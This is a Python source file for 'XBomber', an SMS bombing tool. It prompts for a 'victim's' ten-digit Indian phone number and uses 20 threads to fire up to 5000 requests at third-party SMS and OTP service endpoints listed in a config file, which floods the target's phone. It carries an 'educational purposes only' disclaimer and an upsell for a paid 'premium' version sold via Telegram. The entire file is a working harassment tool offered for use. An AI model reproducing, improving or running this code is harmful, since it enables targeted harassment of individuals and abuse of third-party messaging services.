#!/usr/bin/env python3
import os
import sys
import json
import time
import threading
import webbrowser
from queue import Queue
import requests
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.prompt import Prompt, Confirm

console = Console()

CONFIG = "services.json"
MAX_SMS = 5000
THREADS = 20

# ------------------- Full Original Banner (ANSI) -------------------
def banner():
    os.system('''
    printf "\n"
    printf "    \033[1;35m#     #\033[0m                                           \033[1;90mv2.0.0\033[0m\n"
    printf "    \033[1;35m #   #  \033[1;36m#####   ####  #    # #####  \033[1;31m###### #####\033[0m  \n"
    printf "    \033[1;35m  # #   \033[1;36m#    # #    # ##  ## #    # \033[1;31m#      #    #\033[0m \n"
    printf "    \033[1;35m   #    \033[1;36m#####  #    # # ## # #####  \033[1;31m#####  #    #\033[0m \n"
    printf "    \033[1;35m  # #   \033[1;36m#    # #    # #    # #    # \033[1;31m#      #####\033[0m  \n"
    printf "    \033[1;35m #   #  \033[1;36m#    # #    # #    # #    # \033[1;31m#      #   #\033[0m  \n"
    printf "    \033[1;35m#     # \033[1;36m#####   ####  #    # #####  \033[1;31m###### #    #\033[0m \n"
    printf "\n"
    printf "    \033[1;33m              Created by Alienkrishn [Anon4You]\033[0m   \n"
    printf "    \033[1;34m              Telegram: https://t.me/nullxvoid\033[0m     \n"
    printf "\n"
    printf "  \033[1;41m\033[1;37mㅤ                                                        ㅤ\033[0m\n"
    printf "  \033[1;41m\033[1;37mㅤ    DISCLAIMER: Developer will not be responsible       ㅤ\033[0m\n"
    printf "  \033[1;41m\033[1;37mㅤ    for any misuse or damage caused by this script      ㅤ\033[0m\n"
    printf "  \033[1;41m\033[1;37mㅤ    Please do not use this script for taking Revenge    ㅤ\033[0m\n"
    printf "  \033[1;41m\033[1;37mㅤ    Use this tool for educational purposes only         ㅤ\033[0m\n"
    printf "  \033[1;41m\033[1;37mㅤ                                                        ㅤ\033[0m\n"
    printf "\n"
    ''')

# ------------------- Helper Functions -------------------
def load_services():
    with open(CONFIG, 'r') as f:
        return json.load(f)['services']

def format_phone(phone, fmt):
    p = str(phone).strip()
    if fmt == "with_plus91":
        return f"+91{p}"
    if fmt == "91-":
        return f"91-{p}"
    return p

def send_request(svc, phone):
    method = svc['method'].upper()
    url = svc['url'].replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw')))
    headers = svc.get('headers', {}).copy()
    data = svc.get('data')
    if data:
        data = json.loads(json.dumps(data).replace("{phone}", format_phone(phone, svc.get('phone_format', 'raw'))))
    try:
        if method == 'GET':
            r = requests.get(url, headers=headers, timeout=5)
        elif method == 'POST':
            r = requests.post(url, headers=headers, json=data, timeout=5)
        elif method == 'PUT':
            r = requests.put(url, headers=headers, json=data, timeout=5)
        else:
            return False
        return r.status_code < 500
    except:
        return False

def bomb(phone, total):
    services = load_services()
    tasks = []
    while len(tasks) < total:
        tasks.extend(services)
    tasks = tasks[:total]
    q = Queue()
    for t in tasks:
        q.put(t)
    results = []
    
    def worker():
        while not q.empty():
            svc = q.get()
            ok = send_request(svc, phone)
            results.append((svc['name'], ok))
            q.task_done()
    
    threads = [threading.Thread(target=worker) for _ in range(THREADS)]
    for t in threads:
        t.start()
    q.join()
    return results

# ------------------- Premium Upsell -------------------
def protect_number():
    console.print(Panel.fit(
        "[bold red]Number protection is only available in the PREMIUM script.[/bold red]\n"
        "Get it from the developer.",
        title="Premium Feature",
        border_style="red"
    ))
    if Confirm.ask("[bold yellow]Do you want to buy the premium script?[/bold yellow]"):
        webbrowser.open("https://t.me/alienkrishn?text=xbomber%20premium")
        console.print("[green]Opening Telegram...[/green]")
    else:
        console.print("[blue]Returning to menu.[/blue]")
    input("\nPress Enter...")

# ------------------- Bombing with Progress -------------------
def start_bombing():
    console.print(Panel.fit("[bold cyan]Start Bombing[/bold cyan]", border_style="cyan"))
    phone = Prompt.ask("[bold green]Enter Victim's Phone Number[/bold green] (without +91)", default="")
    if len(phone) != 10 or not phone.isdigit():
        console.print("[red]Invalid! Must be 10 digits.[/red]")
        input("Press Enter...")
        return
    try:
        total = int(Prompt.ask("[bold green]SMS count[/bold green]", default="100"))
        if total <= 0 or total > MAX_SMS:
            raise ValueError
    except:
        console.print(f"[red]Count must be between 1 and {MAX_SMS}.[/red]")
        input("Press Enter...")
        return
    
    console.print(f"\n[yellow]Bombing [bold]{phone}[/bold] with {total} SMS...[/yellow]")
    
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        console=console
    ) as progress:
        task = progress.add_task("[cyan]Sending...", total=total)
        start_time = time.time()
        results = bomb(phone, total)
        progress.update(task, completed=total)
    
    elapsed = time.time() - start_time
    success = sum(1 for _, ok in results if ok)
    
    result_table = Table(title="Bombing Report", style="green")
    result_table.add_column("Metric", style="cyan")
    result_table.add_column("Value", style="white")
    result_table.add_row("Time taken", f"{elapsed:.1f} seconds")
    result_table.add_row("Total SMS", str(total))
    result_table.add_row("Successful", f"[green]{success}[/green]")
    result_table.add_row("Failed", f"[red]{total - success}[/red]")
    console.print(result_table)
    input("\nPress Enter...")

# ------------------- Main Menu -------------------
def menu():
    while True:
        os.system('clear' if os.name == 'posix' else 'cls')
        banner()
        console.print(Panel.fit("[bold yellow]MAIN MENU[/bold yellow]", border_style="yellow"))
        console.print("1. [green]Start Bombing[/green]")
        console.print("2. [yellow]Protect Your Number (Premium)[/yellow]")
        console.print("3. [red]Exit[/red]")
        choice = Prompt.ask("[bold cyan]Select option[/bold cyan]", choices=["1","2","3"])
        if choice == "1":
            start_bombing()
        elif choice == "2":
            protect_number()
        elif choice == "3":
            console.print("\n[bold red]Exiting XBomper...[/bold red]")
            break

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        console.print("\n[red]Interrupted. Exiting...[/red]")
